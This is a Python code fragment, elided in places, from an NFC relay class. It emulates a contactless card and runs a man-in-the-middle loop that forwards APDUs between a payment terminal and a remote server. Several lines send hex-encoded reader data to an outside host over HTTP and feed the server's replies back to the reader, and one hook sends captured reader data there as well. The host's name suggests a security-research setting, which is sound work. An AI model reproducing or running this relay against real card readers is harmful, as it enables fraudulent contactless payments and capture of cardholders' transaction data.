...
class NFCRelay:
    ...
    def emulator_setup(self):
        self.pndTag = NfcTargetCloudEmul()
        ...
        try:
            ...
            while (start_time + timeout_ms > time_ms()) or (timeout_ms == 0) and not is_done:
                ...
                if state == MitmState.FromReader:
                    apdu = "void"
                    while (apdu=="void"):
                        url = "https://www.paymentvillageprocessing.com/apdu.php?state=FromReader&apdu="+session1+"&card="+binascii.hexlify(reader_recvd).decode()+session2 
                        logger.info("URL IS "+str(url))
                        apdu = urllib.request.urlopen(url).read().decode()
                        session2 = "&session="+apdu[:apdu.find("|")]
                        apdu = apdu[apdu.find("|")+1:]
                    #print(apdu.decode().find("|"))
                        if (apdu!="void"):
                            session1 = apdu 
                    #apdu = apdu[apdu.decode().find("|")+1:].decode()
                        logger.info("APDU IS "+str(apdu))
                        #sleep(0.1)
                    target_recvd = binascii.unhexlify(apdu) 
                    ret = 1
                    ...
                    urllib.request.urlopen("https://www.paymentvillageprocessing.com/apdu.php?state=CardRaderHook&apdu="+binascii.hexlify(reader_recvd).decode())
